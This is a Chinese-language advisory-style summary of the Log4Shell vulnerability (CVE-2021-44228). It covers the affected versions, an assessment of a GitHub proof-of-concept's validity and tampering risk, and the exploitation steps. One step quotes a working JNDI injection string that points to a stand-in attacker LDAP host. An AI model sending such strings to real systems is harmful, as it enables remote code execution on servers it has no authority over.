## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包含 security releases 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标应用使用了存在漏洞的Log4j2版本，并且启用了message lookup substitution功能，攻击者能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j 2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI功能，当message lookup substitution功能启用时，攻击者可以通过控制日志消息或日志消息参数，利用JNDI注入，从恶意的LDAP服务器加载并执行任意代码。

**POC有效性：**

根据提供的docker-compose.yaml文件和Dockerfile文件，该POC的目的是创建一个易受攻击的Log4j2 Web应用程序和一个攻击服务器。attack-server 搭建了一个恶意的JNDI服务，用于向目标应用返回恶意payload，实现远程代码执行。

vulnerable-application 使用了tomcat 镜像，部署了 log4shell.war 包，模拟存在漏洞的web应用。

所以POC代码是有效的。

**投毒风险：**

考虑到以下几点，投毒风险评估为10%：

*   **来源可疑：** 漏洞利用代码来自GitHub上公开的JNDI-Exploit-Kit 和 log4j-shell-poc仓库，并说明了原始repository。
*   **简单的命令执行:** JNDI-Exploit-Kit 的Dockerfile中，通过 `-C` 参数执行 curl 命令，如果攻击服务器被篡改或者受到中间人攻击，可能导致执行的命令被替换为恶意代码。
*   **网络依赖：** 该POC依赖于网络连接，如果攻击者可以控制网络流量，可能会劫持请求并注入恶意代码。

虽然存在风险，但是代码的目的相对明确,只是执行`curl` 命令，且给出了原始仓库地址，因此不认为主要目的是投毒，但存在被利用的可能性。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI lookup字符串的请求，例如：`${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用Log4j2记录该请求，触发JNDI lookup。
3.  Log4j2通过JNDI向`attacker.com`的LDAP服务器发起请求。
4.  攻击者的LDAP服务器返回一个包含恶意Java类的JNDI引用。
5.  Log4j2加载并执行该恶意Java类，从而实现远程代码执行。

总结：该漏洞利用简单，危害巨大。POC的有效性高，但存在一定的投毒风险。

**项目地址:** [safeer-accuknox/log4j-shell-poc](https://github.com/safeer-accuknox/log4j-shell-poc)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)